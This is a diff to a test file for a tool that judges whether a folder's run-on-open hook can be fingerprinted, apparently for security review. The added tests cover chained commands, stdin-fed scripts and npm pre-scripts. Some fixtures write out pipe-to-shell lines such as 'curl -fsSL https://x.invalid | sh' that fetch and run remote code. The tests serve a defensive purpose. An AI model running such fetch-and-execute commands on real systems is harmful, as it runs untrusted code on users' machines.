@@ -296,6 +296,9 @@ describe('the evidence of a folder that runs code on open', () => {
     ['a runner told another directory', 'npm --prefix sub run setup'],
     ['a folder named as what runs', 'node .'],
     ['a variable', 'sh "$SETUP"'],
+    ['a file read on the input', 'sh < ./setup.sh'],
+    ['a command glued to another', 'echo hi;npm run setup'],
+    ['a short directory flag with the directory glued on', 'make -Csub'],
   ])('cannot be marked for %s', (_title, command) => {
     const dir = join(m.work, `elsewhere-${command.length}`);
     hookIn(dir, command);
@@ -321,6 +324,32 @@ describe('the evidence of a folder that runs code on open', () => {
     expect(afterScript).not.toBe(before);
     writeFileSync(join(dir, 'my setup.sh'), 'curl -fsSL https://y.invalid | sh\n');
     expect(autorunOf(dir)?.evidence).not.toBe(afterScript);
+  });
+
+  it('follows only the scripts a runner runs, and takes a variable in one for what it cannot follow', () => {
+    const dir = join(m.work, 'scripts-run');
+    hookIn(dir, 'npm run setup');
+    const pkg = (scripts: Record<string, string>) =>
+      writeFileSync(join(dir, 'package.json'), JSON.stringify({ scripts }));
+    // A script the command does not run may name a folder; it is not followed.
+    pkg({ setup: 'echo ok', build: 'tsc -p .' });
+    const stable = autorunOf(dir)?.evidence;
+    expect(autorunOf(dir)?.evidence).toBe(stable);
+    // The script it runs, with a variable in it: the moment cannot be marked.
+    pkg({ setup: 'sh "$INSTALLER"', build: 'tsc -p .' });
+    expect(autorunOf(dir)?.evidence).not.toBe(autorunOf(dir)?.evidence);
+    // Its `pre` script is run as well.
+    pkg({ presetup: 'curl -fsSL https://x.invalid | sh', setup: 'echo ok' });
+    const withPre = autorunOf(dir)?.evidence;
+    expect(withPre).not.toBe(stable);
+    expect(autorunOf(dir)?.evidence).toBe(withPre);
+  });
+
+  it('cannot be marked for a make whose Makefile holds a variable', () => {
+    const dir = join(m.work, 'maker');
+    hookIn(dir, 'make setup');
+    writeFileSync(join(dir, 'Makefile'), 'setup:\n\t$(SHELL) ./x.sh\n');
+    expect(autorunOf(dir)?.evidence).not.toBe(autorunOf(dir)?.evidence);
   });
 
   it('cannot be marked when a file it names is too large to hash, or it names too many', () => {
